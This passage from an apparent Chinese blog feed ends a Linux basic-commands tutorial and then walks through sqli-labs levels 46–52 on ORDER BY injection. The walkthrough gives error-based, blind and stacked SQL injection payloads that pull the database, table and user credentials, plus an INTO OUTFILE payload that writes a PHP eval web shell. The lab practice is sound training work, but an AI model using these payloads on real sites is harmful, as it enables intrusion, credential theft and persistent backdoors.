print working directory</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191154251.png" alt="image-20220319115426221"></p><h4 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h4><p>cd命令用于切换当前的工作路径,英文为 change directoey 语法格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd [参数] [目录]</span><br></pre></td></tr></table></figure><p>这个命令应该是最常用的一个命令了,可以使用 cd - 命令返回上一次所处的目录,使用cd .. 命令进入上级目录,以及使用 cd ~命令切换到当前用户的家目录亦或使用 cd ~username 命令切换到其他用户的家目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191158017.png" alt="image-20220319115836982"></p><h4 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h4><p>ls命令用于显示目录中的文件信息,英文全称为list 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls [参数] [文件名称]</span><br></pre></td></tr></table></figure><p>使用ls -a 参数能够看到全部的文件,使用 ls -l参数可以查看文件的属性,大小等详细信息.将这两个参数进行整合之后再次执行ls命令即可查看当前目录中的所有文件并输出这些文件的属性信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191201598.png" alt="image-20220319120140552"></p><p>如果想要查看目录属性信息,需要额外添加一个-d参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191202009.png" alt="image-20220319120242976"></p><h4 id="tree命令"><a href="#tree命令" class="headerlink" title="tree命令"></a>tree命令</h4><p>tree命令用于以树状图的形式列出目录内容以及结构,输入该命令之后按回车可以执行</p><p>虽然ls命令可以很便捷的查看目录内有哪些文件,但是无法直观的获取到目录内文件的层次结构</p><h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><p>find命令用于按照指定的条件来查找文件所对应的位置,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find [查找范围] 寻找条件</span><br></pre></td></tr></table></figure><p>搜索工作一般都是通过find命令来完成的，它可以使用不同的文件特性作为寻找条件（如文件名、大小、修改时间、权限等信息），一旦匹配成功则默认将信息显示到屏幕上</p><p> find命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-name</td><td>匹配名称</td></tr><tr><td>-perm</td><td>匹配权限（mode为完全匹配，-mode为包含即可）</td></tr><tr><td>-user</td><td>匹配所有者</td></tr><tr><td>-group</td><td>匹配所有组</td></tr><tr><td>-mtime -n +n</td><td>匹配修改内容的时间（-n指n天以内，+n指n天以前）</td></tr><tr><td>-atime -n +n</td><td>匹配访问文件的时间（-n指n天以内，+n指n天以前）</td></tr><tr><td>-ctime -n +n</td><td>匹配修改文件权限的时间（-n指n天以内，+n指n天以前）</td></tr><tr><td>-nouser</td><td>匹配无所有者的文件</td></tr><tr><td>-nogroup</td><td>匹配无所有组的文件</td></tr><tr><td>-newer f1 !f2</td><td>匹配比文件f1新但比f2旧的文件</td></tr><tr><td>-type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f</td><td>匹配文件类型（后面的字幕字母依次表示块设备、目录、字符设备、管道、链接文件、文本文件）</td></tr><tr><td>-size</td><td>匹配文件的大小（+50KB为查找超过50KB的文件，而-50KB为查找小于50KB的文件）</td></tr><tr><td>-prune</td><td>忽略某个目录</td></tr><tr><td>-exec …… {};</td><td>后面可跟用于进一步处理搜索结果的命令（下文会有演示）</td></tr></tbody></table><p>这里说明一下 -exec 参数的作用,这个参数用于把find命令搜索到的结果交由紧随其后的命令做进一步处理.他类似于管道符</p><p>linux系统中的配置文件都会保存到&#x2F;etc目录 如果想要获取改目录中所有以host开头的文件列表</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191209422.png" alt="image-20220319120912380"></p><p>如果要在整个系统中搜索权限中包括suid权限的所有文件,只需要使用-4000</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191210483.png" alt="image-20220319121024441"></p><h4 id="locate命令"><a href="#locate命令" class="headerlink" title="locate命令"></a>locate命令</h4><p>locate命令用于按照命令快速搜索文件所对应的位置,语法格式为 locate文件名称</p><p>使用find命令进行全麻搜索虽然更准确,但是效率有点低.如果是仅仅想找一些常见的而且又知道大概名称的文件,不如试试locate命令.在使用locate命令时,先使用updatedb命令生成一个索引库文件,这个库文件的名称是&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db,后续在使用locate命令搜索文件时就是在该库中进行查找操作,速度会快很多</p><p>第一次使用locate命令之前,记得先执行updatedb命令来生成索引数据库在进行查找</p><h4 id="whereis命令"><a href="#whereis命令" class="headerlink" title="whereis命令"></a>whereis命令</h4><p>whereis命令用于按照名称快速搜索二进制程序(命令),源代码以及帮助文件对应的位置,语法格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis 命令名称</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191218551.png" alt="image-20220319121816516"></p><h3 id="文本文件编辑命令"><a href="#文本文件编辑命令" class="headerlink" title="文本文件编辑命令"></a>文本文件编辑命令</h3><h4 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h4><p>cat命令用于查看纯文本文件(内容较少的),英文全称为 concatenate 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat [参数] 文件名称</span><br></pre></td></tr></table></figure><p>linux系统中有多个用于查看文本内容的命令,每个命令都有自己的特点</p><p>如果想要在查看内容的同时显示行号的话,在cat命令后面加一个-n参数</p><h4 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h4><p>more命令用于查看纯文本文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more [参数] 文件名称</span><br></pre></td></tr></table></figure><h4 id="head命令"><a href="#head命令" class="headerlink" title="head命令"></a>head命令</h4><p>head命令用于查看纯文本文件的前n行,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">head [参数] 文件名称</span><br></pre></td></tr></table></figure><h4 id="tail命令"><a href="#tail命令" class="headerlink" title="tail命令"></a>tail命令</h4><p>tail命令用于查看纯文本文件的后n行或者持续刷新的文件的最新的内容,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail [参数] 文件名称</span><br></pre></td></tr></table></figure><p>我们还可能遇到另一种情况,比如要查看文本内容的最后十行,这个时候就需要用到tail命令的操作方法与head命令相似</p><p>tail命令还能够持续刷新一个文件的内容,当想要实时查看最新的日志文件的时候,这特别有用,此时的命令格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -f 文件名称</span><br></pre></td></tr></table></figure><h4 id="tr命令"><a href="#tr命令" class="headerlink" title="tr命令"></a>tr命令</h4><p>tr命令用于替换文本内容中的字符,英文全称为 transform 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tr [原始字符] [目标字符]</span><br></pre></td></tr></table></figure><p>在很多时候，我们想要快速地替换文本中的一些词汇，又或者想把整个文本内容都进行替换。如果进行手工替换，难免工作量太大，尤其是需要处理大批量的内容时，进行手工替换更是不现实。这时，就可以先使用cat命令读取待处理的文本，然后通过管道符把这些文本内容传递给tr命令进行替换操作即可。例如，把某个文本内容中的英文全部替换为大写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat anaconda-ks.cfg | tr [a-z] [A-Z]</span><br></pre></td></tr></table></figure><h4 id="wc命令"><a href="#wc命令" class="headerlink" title="wc命令"></a>wc命令</h4><p>wc命令用于统计指定文本文件的行数 字数或字节数 word counts 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wc [参数] 文件名称</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211216963.png" alt="image-20220321121628917"></p><h4 id="stat命令"><a href="#stat命令" class="headerlink" title="stat命令"></a>stat命令</h4><p>stat命令用于查看文件的具体存储细节和时间等信息,英文全称为 status</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stat [文件名称]</span><br></pre></td></tr></table></figure><p>文件有一个修改时间,Access Time 内容最后一次被访问的时间,Modigy Time 内容最后一次被修改的时间,简称为Mtime,以及Change Time 文件属性最后一次被修改时间</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211220442.png" alt="image-20220321122012402"></p><h4 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h4><p>grep命令用于按行提取文本内容,语法格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep [参数] 文件名称</span><br></pre></td></tr></table></figure><p>grep命令时用途最广泛的文本搜索匹配工具,grep最常用的两个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-n 用来显示搜索到的信息的行号</span><br><span class="line">-v参数用于反选信息</span><br></pre></td></tr></table></figure><p> grep命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-b</td><td>将可执行文件(binary)当作文本文件（text）来搜索</td></tr><tr><td>-c</td><td>仅显示找到的行数</td></tr><tr><td>-i</td><td>忽略大小写</td></tr><tr><td>-n</td><td>显示行号</td></tr><tr><td>-v</td><td>反向选择——仅列出没有“关键词”的行。</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211224730.png" alt="image-20220321122415687"></p><h4 id="cut命令"><a href="#cut命令" class="headerlink" title="cut命令"></a>cut命令</h4><p>cut命令用于按列提取文本内容,语法格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cut [参数] 文件名称</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211225315.png" alt="image-20220321122550279"></p><h4 id="diff命令"><a href="#diff命令" class="headerlink" title="diff命令"></a>diff命令</h4><p>diff命令用于比较多个文件之间的内容的差异,英文是 different 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff [参数] 文件名称A 文件名称B</span><br></pre></td></tr></table></figure><p>使用diff命令时,不经可以使用 –brief 参数来确定两个文件是否相同,还可以使用 -c 参数来详细比较出多个文件的差异之处</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211228862.png" alt="image-20220321122852823"></p><h4 id="uniq命令"><a href="#uniq命令" class="headerlink" title="uniq命令"></a>uniq命令</h4><p>uniq命令用于去除文本中连续的重复行,英文 unique 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniq [参数] 文件名称</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211230207.png" alt="image-20220321123022170"></p><h4 id="sort命令"><a href="#sort命令" class="headerlink" title="sort命令"></a>sort命令</h4><p>sort命令用于对文本内容进行在排序,语法格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort [参数] 文件名称</span><br></pre></td></tr></table></figure><p> sort命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-f</td><td>忽略大小写</td></tr><tr><td>-b</td><td>忽略缩进与空格</td></tr><tr><td>-n</td><td>以数值型排序</td></tr><tr><td>-r</td><td>反向排序</td></tr><tr><td>-u</td><td>去除重复行</td></tr><tr><td>-t</td><td>指定间隔符</td></tr><tr><td>-k</td><td>设置字段范围</td></tr></tbody></table><h3 id="文件目录管理命令"><a href="#文件目录管理命令" class="headerlink" title="文件目录管理命令"></a>文件目录管理命令</h3><h4 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h4><p>touch命令用于创建空白文件或设置文件的时间,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch [参数] 文件名称</span><br></pre></td></tr></table></figure><p>在创建空白的文本文件方面,这个touch命令相当简洁</p><p>touch命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-a</td><td>仅修改“读取时间”（atime）</td></tr><tr><td>-m</td><td>仅修改“修改时间”（mtime）</td></tr><tr><td>-d</td><td>同时修改atime与mtime</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211234503.png" alt="image-20220321123429462"></p><h4 id="mkdir-命令"><a href="#mkdir-命令" class="headerlink" title="mkdir 命令"></a>mkdir 命令</h4><p>mkdir命令用于创建空白的目录, 英文 make directory 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir [参数] 目录名称</span><br></pre></td></tr></table></figure><p>除了能创建单个空白目录,mkdir命令还可以结合-p参数来递归创建出具有嵌套层叠关系的文件目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211235312.png" alt="image-20220321123549266"></p><h4 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h4><p>cp命令用于复制文件或目录,英文copy,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp [参数] 源文件名称 目标文件名称</span><br></pre></td></tr></table></figure><p>复制的操作有三种情况</p><ul><li>如果目标文件是目录,则会把源文件复制到该目录中</li><li>如果目标文件也是普通文件,则会询问是否要覆盖他</li><li>如果目标文件不存在,则执行正常的复制操作</li></ul><p>要记住复制目录时要加上-r参数</p><p> cp命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p</td><td>保留原始文件的属性</td></tr><tr><td>-d</td><td>若对象为“链接文件”，则保留该“链接文件”的属性</td></tr><tr><td>-r</td><td>递归持续复制（用于目录）</td></tr><tr><td>-i</td><td>若目标文件存在则询问是否覆盖</td></tr><tr><td>-a</td><td>相当于-pdr（p、d、r为上述参数）</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211240960.png" alt="image-20220321124038914"></p><h4 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h4><p>mv命令用于剪切或者重命名文件,英文全称为 move 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv [参数] 源文件名称 目标文件名称</span><br></pre></td></tr></table></figure><p>剪切操作不同于复制操作,因为它默认会把源文件删除,只保留剪切后的文件.如果在同一个目录中将某个文件剪切后还粘贴到当前的目录下面,其实就是对该文件的重命名操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211243172.png" alt="image-20220321124355135"></p><p>rm命令</p><p>rm命令用于删除文件或者目录,英文全称为 remove 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm [参数] 文件 名称</span><br></pre></td></tr></table></figure><p>linux系统中删除文件是,系统会默认向您询问是否要执行删除操作,如果不想总是看见这种反复的确认信息,可以在rm命令后跟上 -f 参数来强制删除,另外想要删除一个目录,需要在rm命令后面加上一个-r参数才可以,否则删除不掉</p><p>rm命令中的参数及其作用</p><table><thead><tr><th>参数</th><th align="left">作用</th></tr></thead><tbody><tr><td>-f</td><td align="left">强制执行</td></tr><tr><td>-i</td><td align="left">删除前询问</td></tr><tr><td>-r</td><td align="left">删除目录</td></tr><tr><td>-v</td><td align="left">显示过程</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211248722.png" alt="image-20220321124800674"></p><h4 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h4><p>dd命令用于按照指定大小和个数的数据块来复制文件或者转换文件,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=参数值 of=参数值 count=参数值 bs=参数值</span><br></pre></td></tr></table></figure><p>  dd命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>if</td><td>输入的文件名称</td></tr><tr><td>of</td><td>输出的文件名称</td></tr><tr><td>bs</td><td>设置每个“块”的大小</td></tr><tr><td>count</td><td>设置要复制“块”的个数</td></tr></tbody></table><h4 id="file命令"><a href="#file命令" class="headerlink" title="file命令"></a>file命令</h4><p>file命令用于查看文件的类型,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file 文件名称</span><br></pre></td></tr></table></figure><p>在linux中,由于文本,目录,设备等所有这些一切都有统称为文件,但是他们不像win系统哪有带有后缀,因此难以通过文件名一眼看出具体的文件类型.这个时候就需要file命令来查看文件类型了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211253546.png" alt="image-20220321125355500"></p><p>在win系统中打开文件时,一般都是通过用户双击鼠标来完成的,系统会自动判断用户双击的文件是什么类型,因此需要有后缀进行区别,而linux系统则是根据用户执行的命令来调用文件,例如执行cat命令查看文本,执行bash命令执行脚本等,所以也就不需要强制让用户给文件设置后缀了</p><h4 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h4><p>tar命令用于对文件进行打包压缩或者解压语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar 参数 文件名称</span><br></pre></td></tr></table></figure><p>在网络上,人们越来越倾向于传输压缩格式的文件,原因是压缩文件的体积小,在网速相同的情况下,体积越小则传输的时间越短.在linux系统只不过,主要使用.tar .tar.gz 或者 .tar.bz2格式,这些格式大部分都是用tar命令生成的</p><p> tar命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c</td><td>创建压缩文件</td></tr><tr><td>-x</td><td>解开压缩文件</td></tr><tr><td>-t</td><td>查看压缩包内有哪些文件</td></tr><tr><td>-z</td><td>用Gzip压缩或解压</td></tr><tr><td>-j</td><td>用bzip2压缩或解压</td></tr><tr><td>-v</td><td>显示压缩或解压的过程</td></tr><tr><td>-f</td><td>目标文件名</td></tr><tr><td>-p</td><td>保留原始的权限与属性</td></tr><tr><td>-P</td><td>使用绝对路径来压缩</td></tr><tr><td>-C</td><td>指定解压到的目录</td></tr></tbody></table><p>首先 -c 参数用于创建压缩文件, -x 参数用于解压文件 因此这两个参数不能同时使用, 其次, -z 参数指定使用 gzip 的格式来压缩或者解压文件 -j 参数指定使用bzip2格式来压缩或者解压问价.用户使用时则是根据文件的后缀来决定使用那种格式的参数来进行解压.在执行某些压缩或者解压缩操作时,可能需要花费数个小时,如果屏幕一直没有输出,您不好判断打包的进度情况,因此可以使用 -v 参数向用户不断显示压缩或者解压缩的过程 -C 参数用于指定要解压到那个指定的目录 -f 参数很重要,他必须放在参数的最后一位,代表要压缩或者解压缩的软件包的名称 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">压缩tar -czvf 压缩包名称.tar.gz 要打包的目录</span><br><span class="line">解压tar -xzvf 压缩包名称.tar.gz </span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211307467.png" alt="image-20220321130716412"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211315337.png" alt="image-20220321131538289"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录排序注入(九)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5(%E4%B9%9D)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5(%E4%B9%9D)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录排序注入-九"><a href="#sqlilabs靶场记录排序注入-九" class="headerlink" title="sqlilabs靶场记录排序注入(九)"></a>sqlilabs靶场记录排序注入(九)</h1><h2 id="less-46基于错误GET数字型排序注入"><a href="#less-46基于错误GET数字型排序注入" class="headerlink" title="less-46基于错误GET数字型排序注入"></a>less-46基于错误GET数字型排序注入</h2><p>这一关首先要说一下的是，在前面的关卡中我们大多是使用 id这个参数来获取到正常的页面，但在这几关中我们要使用 sort 这个参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181936533.png" alt="image-20220318193618446"></p><p>我们看到了正常的页面，从中我们也发现了数字的不同，页面给我们呈现出的账号表格中的顺序是不同的，那么这就是我们这几关要说的知识点。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这关往后都是order by语句与limit语句的相关注入，还是很实用的，尤其是对于一些会显示表格的网站，他们的 URL 中通常都会有sort和limit两个参数。</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181937263.png" alt="image-20220318193754203"></p><p>从中我们了解到通过sort参数接受需要排序的列的序号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试sort asc 和sort=1 desc 分别显示升序和降序的表格,说明次数是注入点,即注入点在order by后面的参数中.而order by不同于在where后的注入,不能使用union等进行注入.</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181944162.png" alt="image-20220318194402093"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181944322.png" alt="image-20220318194417266"></p><p>order by后的数字可以作为一个注入点.也就是构造order by 后的一个语句,让改语句执行结果为一个数,我们尝试:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left(version(),1)right(version(),1)</span><br></pre></td></tr></table></figure><p>没有报错，但是 right 换成 left 都一样，说明数字没有起作用</p><p>仔细考虑一下,就会发现这里的字段数目是一定的,也就是说明这里的字段数最大就是3.那么我们当然不能使用超过3以上的数字来进行判断了</p><p>但是这里我们可以使用布尔类型,报错注入,时间盲注</p><p><strong>基于报错</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库:</span><br><span class="line">(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</span><br><span class="line">爆表:</span><br><span class="line">(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),floor(rand()*2))as a from information_schema.tables group by a) b)</span><br><span class="line">或者:</span><br><span class="line">(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),floor(rand()*2))as a from information_schema.tables group by a) b)</span><br><span class="line">字段名:</span><br><span class="line">(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)</span><br><span class="line">爆数据:</span><br><span class="line">(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select concat_ws(&#x27;-&#x27;,id,username,password) from users limit 0,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)</span><br></pre></td></tr></table></figure><p><strong>延时注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(mid(database(),1,1))=115,sleep(3),0) </span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rand(ascii(left(database(),1))=115)正确的</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181957928.png" alt="image-20220318195733861"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rand(ascii(left(database(),1))=116)错误的</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181957876.png" alt="image-20220318195750814"></p><p><strong>procedure analyse 参数后注入</strong></p><p>利用 procedure analyse 参数，我们可以执行报错注入。同时，在 procedure analyse 和 order by 之间可以存在 limit 参数，我们在实际应用中，往往也可能会存在 limit 后的注入，可以利用 procedure analyse 进行注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182001373.png" alt="image-20220318200133309"></p><p><strong>导出文件 into outfile 参数注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 into outfile &quot;D:\\Data\\secquan\\tools\\Environment\\PhpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\test.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182003172.png" alt="image-20220318200343101"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182004404.png" alt="image-20220318200411347"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 into outfile &quot;D:\\Data\\secquan\\tools\\Environment\\PhpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\test.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b227a66225d293b3f3e</span><br><span class="line"></span><br><span class="line">其中lines terminates by将每行以指定字符串结尾：</span><br><span class="line">    0x3c3f706870206576616c28245f504f53545b227a66225d293b3f3e = hex(&lt;?php eval($_POST[&quot;zf&quot;]);?&gt;)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182006598.png" alt="image-20220318200654533"></p><h2 id="Less-47基于错误GET字符型单引号排序注入"><a href="#Less-47基于错误GET字符型单引号排序注入" class="headerlink" title="Less-47基于错误GET字符型单引号排序注入"></a>Less-47基于错误GET字符型单引号排序注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182013086.png" alt="image-20220318201308014"></p><p>将 id 变为字符型，因此根据我们上述提到的知识，我们依旧按照注入的位置进行分类。(不过这里还要说一点的是在Less-46关中，我们没有用注释符是因为他是数字型，且注入的位置在SQL语句末尾，而字符型就必须要注释了，否则无法进行单引号的正常闭合)</p><p><strong>基于报错注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182014049.png" alt="image-20220318201401990"></p><p><strong>基于 Time 盲注</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(ascii(mid(database(),1,1))=115,1,sleep(0.3))--+</span><br></pre></td></tr></table></figure><h2 id="less-48基于盲注GET数字型排序注入"><a href="#less-48基于盲注GET数字型排序注入" class="headerlink" title="less-48基于盲注GET数字型排序注入"></a>less-48基于盲注GET数字型排序注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182019088.png" alt="image-20220318201958023"></p><p>与 less-46 的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的</p><h2 id="Less-49基于盲注GET字符型单引号排序注入"><a href="#Less-49基于盲注GET字符型单引号排序注入" class="headerlink" title="Less-49基于盲注GET字符型单引号排序注入"></a>Less-49基于盲注GET字符型单引号排序注入</h2><p>与 47 关基本类似，区别在于没有错误回显，所以我们可以通过延时注入和导入文件进<br>行注入</p><p><strong>基于 Time 盲注</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(ascii(mid(database(),1,1))=115,1,sleep(1))--+</span><br></pre></td></tr></table></figure><h2 id="Less-50基于错误GET数字型排序堆叠注入"><a href="#Less-50基于错误GET数字型排序堆叠注入" class="headerlink" title="Less-50基于错误GET数字型排序堆叠注入"></a>Less-50基于错误GET数字型排序堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182054403.png" alt="image-20220318205427348"></p><p>我们从源码可以看到，一般后台查询数据库使用的语句都是mysql_query()，而可以堆叠注入的后台使用的是mysqli_multi_query()。（这个函数是能否进行堆叠注入的关键）</p><p>排序注入在这一关通用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</span><br><span class="line">1 and (updatexml(1,concat(0x7e,(select database())),0)) </span><br></pre></td></tr></table></figure><p>堆叠注入的方法也同样适用这一关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;insert into users(id,username,password) values(50,&#x27;Less50&#x27;,&#x27;Less50&#x27;)--+</span><br></pre></td></tr></table></figure><h2 id="Less-51基于错误GET字符型单引号排序堆叠注入"><a href="#Less-51基于错误GET字符型单引号排序堆叠注入" class="headerlink" title="Less-51基于错误GET字符型单引号排序堆叠注入"></a>Less-51基于错误GET字符型单引号排序堆叠注入</h2><p>和Less-50的操作基本一样，只要注意单引号的闭合和注释符就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+</span><br><span class="line">1&#x27;;insert into users values(51,&#x27;Less51&#x27;,&#x27;Less51&#x27;)--+</span><br></pre></td></tr></table></figure><h2 id="Less-52基于Bool-GET数字型盲注堆叠注入"><a href="#Less-52基于Bool-GET数字型盲注堆叠注入" class="headerlink" title="Less-52基于Bool_GET数字型盲注堆叠注入"></a>Less-52基于Bool_GET数字型盲注堆叠注入</h2><p>Less-50 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于 stacked injection 是  